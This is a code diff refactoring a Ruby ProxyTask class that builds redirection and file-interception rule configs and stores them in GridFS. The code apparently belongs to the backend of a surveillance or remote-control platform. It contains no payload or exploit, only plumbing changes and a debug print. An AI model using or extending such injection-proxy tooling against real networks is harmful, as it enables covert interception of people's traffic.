@@ -1,26 +1,20 @@
-require_relative 'generator'
-require_relative '../build'
+require_relative '../tasks'
 
 module RCS
 module DB
 
 class ProxyTask
-  extend TaskGenerator
+  include RCS::DB::NoFileTaskType
   include RCS::Tracer
 
-  build
-
-  def initialize(params)
-    @params = params
-    @proxy = ::Proxy.find(params['proxy_id'])
-  end
-  
   def total
-    @proxy.rules.where(:enabled => true).count + 1
+    proxy = ::Proxy.find(@params['proxy_id'])
+    proxy.rules.where(:enabled => true).count + 1
   end
   
   def next_entry
-
+    proxy = ::Proxy.find(@params['proxy_id'])
+    
     base = rand(10)
     progressive = 0
     redirect_user = {}
@@ -28,9 +22,9 @@ class ProxyTask
     intercept_files = []
     vector_files = {}
 
-    @proxy.rules.where(:enabled => true).each do |rule|
+    proxy.rules.where(:enabled => true).each do |rule|
 
-      tag = @proxy.redirection_tag + (base + progressive).to_s
+      tag = proxy.redirection_tag + (base + progressive).to_s
       progressive += 1
 
       yield @description = "Creating rule No: #{progressive}"
@@ -82,18 +76,20 @@ class ProxyTask
 
     trace :info, "Proxy config file size: " + File.size(file).to_s
 
+    puts "PROXY GRID: #{proxy[:_grid]}"
+
     # make sure to delete the old one first
-    GridFS.delete @proxy[:_grid].first
+    GridFS.delete proxy[:_grid].first unless proxy[:_grid].nil?
 
     # save the binary config into the grid, it will be requested by NC later
-    @proxy[:_grid] = [ GridFS.put(File.open(file, 'rb+'){|f| f.read}, {filename: @proxy[:_id].to_s}) ]
-    @proxy[:_grid_size] = File.size(file)
+    proxy[:_grid] = [ GridFS.put(File.open(file, 'rb+'){|f| f.read}, {filename: proxy[:_id].to_s}) ]
+    proxy[:_grid_size] = File.size(file)
 
     # delete the temp file
     File.delete(file)
 
-    @proxy.configured = false
-    @proxy.save
+    proxy.configured = false
+    proxy.save
 
   end
 end
